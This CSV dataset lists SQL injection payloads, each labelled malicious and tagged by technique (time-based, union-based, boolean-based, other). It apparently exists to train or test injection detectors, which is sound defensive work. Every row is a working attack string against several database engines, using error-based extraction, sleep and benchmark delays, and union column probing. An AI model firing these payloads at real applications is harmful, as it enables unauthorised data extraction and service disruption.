Query,Label,Attack_Type
1'   )    )    as cmll where 7948  =  7948 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,Other_Malicious
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",1,Other_Malicious
"1'   )    )    as xrre where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,Other_Malicious
"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",1,Time-based
"1'||  (  select 'yhkt' from dual where 7105  =  7105 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'",1,Union-based
"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'pded'  =  'pded",1,Time-based
1  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  3836  =  3836,1,Other_Malicious
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",1,Time-based
"1%""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""%""  =  """,1,Other_Malicious
1%'   )    )    and 4595  =  4595#,1,Boolean-based
"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,Other_Malicious
"1   )    )    as avdz where 1881  =  1881 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,Other_Malicious
1'+  (  select 'stdl' where 4581  =  4581,1,Other_Malicious
1%'   )    )    and 2006  =  2006,1,Boolean-based
"1%""  )   union all select null,null,null,null,null,null,null,null--",1,Union-based
1   )    )    as dqfl where 7527  =  7527,1,Other_Malicious
"1' in boolean mode  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,Other_Malicious
"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,Time-based
select case when 7717  =  7717 then 1 else null end--,1,Other_Malicious
"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,1,Other_Malicious
"  (  select * from generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   limit 1  )  ",1,Other_Malicious
"1  )   as vzyk where 5103  =  5103 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,Other_Malicious
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'vvkl'  =  'vvkl",1,Other_Malicious
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",1,Other_Malicious
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'cogk'  =  'cogk",1,Union-based
"-1692'  )   union all select 7074,7074,7074,7074,7074,7074,7074#",1,Union-based
1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',1,Time-based
"1""  )   as sraw where 1997  =  1997 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,Other_Malicious
"1""  )   where 9248  =  9248",1,Other_Malicious
"1""  )   where 9855  =  9855",1,Other_Malicious
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- xlfz",1,Other_Malicious
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""tbcc""  =  ""tbcc",1,Other_Malicious
-7345  )   union all select 3866#,1,Union-based
"1   )    )     )   union all select null,null,null,null,null,null,null,null#",1,Union-based
"1%""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""%""  =  """,1,Time-based
1' rlike sleep  (  5  )  #,1,Time-based
"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,Time-based
1' where 8469  =  8469,1,Other_Malicious
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'ngwt'  =  'ngwt",1,Other_Malicious
"1'  )   as pkis where 3446  =  3446 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,Other_Malicious
"1"" where 6785  =  6785 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,Other_Malicious
"1%'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",1,Other_Malicious
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1,Other_Malicious
1' in boolean mode  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   #,1,Other_Malicious
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  ||'",1,Time-based
"-6440   )    )     )   union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",1,Union-based
"-9924   )    )    as zgqa where 2867  =  2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",1,Union-based
1  )   as gfhf where 5804  =  5804 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,Time-based
"1""  )   as dgzf where 4834  =  4834",1,Other_Malicious
-4324 order by 1--,1,Other_Malicious
"-8557 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,Other_Malicious
end--,1,Other_Malicious
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ugtw""  =  ""ugtw",1,Other_Malicious
1   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   4279  =  4279,1,Other_Malicious
1%'   )    )    rlike sleep  (  5  )  #,1,Time-based
"1' and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,Other_Malicious
"1   )    )    as fwru where 5262  =  5262 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,Other_Malicious
"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",1,Union-based
1'  )   as wpmv where 1479  =  1479 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,Other_Malicious
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,Other_Malicious
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,1,Time-based
"-8754""   )    )     )   union all select 7391,7391,7391,7391,7391,7391,7391--",1,Union-based
"-4406%' union all select 9599,9599,9599,9599#",1,Union-based
"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,Time-based
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,Time-based
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,1,Other_Malicious
"select benchmark  (  5000000,md5  (  0x714e4153   )    )   #",1,Time-based
"1%'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  '%'  =  '",1,Time-based
"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",1,Union-based
"1'  )   where 1804  =  1804 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,Time-based
1  )   as uuro where 6784  =  6784,1,Other_Malicious
-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254,1,Other_Malicious
"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",1,Union-based
"1,  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",1,Other_Malicious
"-6014"" or make_set  (  3003  =  2609,2609  )  ",1,Other_Malicious
1  )   where 6424  =  6424,1,Other_Malicious
1%' or sleep  (  5  )  #,1,Time-based
1' or sleep  (  5  )   and 'yudo'  =  'yudo,1,Time-based
1'||  (  select 'sxya' where 3578  =  3578,1,Other_Malicious
"1""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""nrhz"" like ""nrhz",1,Other_Malicious
"select * from generate_series  (  7667,7667,case when   (  7667  =  8232  )   then 1 else 0 end  )   limit 1--",1,Other_Malicious
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'lxoc'  =  'lxoc",1,Other_Malicious
"1' where 4150  =  4150 and elt  (  8012  =  6026,6026  )  --",1,Other_Malicious
"1,iif  (  6333  =  1227,1,1/0  )  ",1,Other_Malicious
"1   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,Other_Malicious
"1""  )   as jqli where 7793  =  7793",1,Other_Malicious
1'   )    )     )   and 6991  =  5579,1,Boolean-based
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,1,Time-based
1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,Time-based
"1  )   as idvt where 3490  =  3490 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,Other_Malicious
"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,Other_Malicious
"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",1,Union-based
 (  select * from   (  select  (  sleep  (  5   )    )     )  acdk  )  #,1,Time-based
1'+  (  select 'kcix' where 1117  =  1117,1,Other_Malicious
1'+  (  select 'jaok' where 2592  =  2592,1,Other_Malicious
"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ossj'  =  'ossj",1,Time-based
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'aqdj'  =  'aqdj",1,Time-based
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,Other_Malicious
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm",1,Other_Malicious
"1',exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,Other_Malicious
"1""   )    )    as jebl where 3464  =  3464",1,Other_Malicious
"-3632' or make_set  (  9354  =  9354,7185  )   and 'lgpy' like 'lgpy",1,Other_Malicious
-5147 or   (  8459  =  8459  )  *4906,1,Other_Malicious
"1'   )    )    union all select null,null,null,null,null,null,null#",1,Union-based
"1""  )   as bksv where 5375  =  5375",1,Other_Malicious
"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",1,Union-based
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'dreq'  =  'dreq",1,Other_Malicious
"1%""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """,1,Other_Malicious
1  )   where 6039  =  6039 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,Other_Malicious
"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",1,Union-based
1  )   and 7533  =  7533,1,Boolean-based
"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",1,Union-based
"1,  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1,Other_Malicious
1%' union all select null--,1,Union-based
"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xtyt""  =  ""xtyt",1,Other_Malicious
"select sleep  (  5  )   and    (    (   ""twed"" like ""twed",1,Time-based
1' where 8729  =  8729,1,Other_Malicious
"1'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   'xjns'  =  'xjns",1,Other_Malicious
"-3667%'   )    )    union all select 3560,3560,3560--",1,Union-based
"-8655  )   where 3910  =  3910 union all select 3910,3910#",1,Union-based
"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",1,Time-based
-5569'  )   as cjaf where 3753  =  3753 union all select 3753#,1,Union-based
1  )   where 9078  =  9078 rlike sleep  (  5  )  #,1,Time-based
"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'tkcy' like 'tkcy",1,Other_Malicious
-2210' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'myvr' like 'myvr,1,Other_Malicious
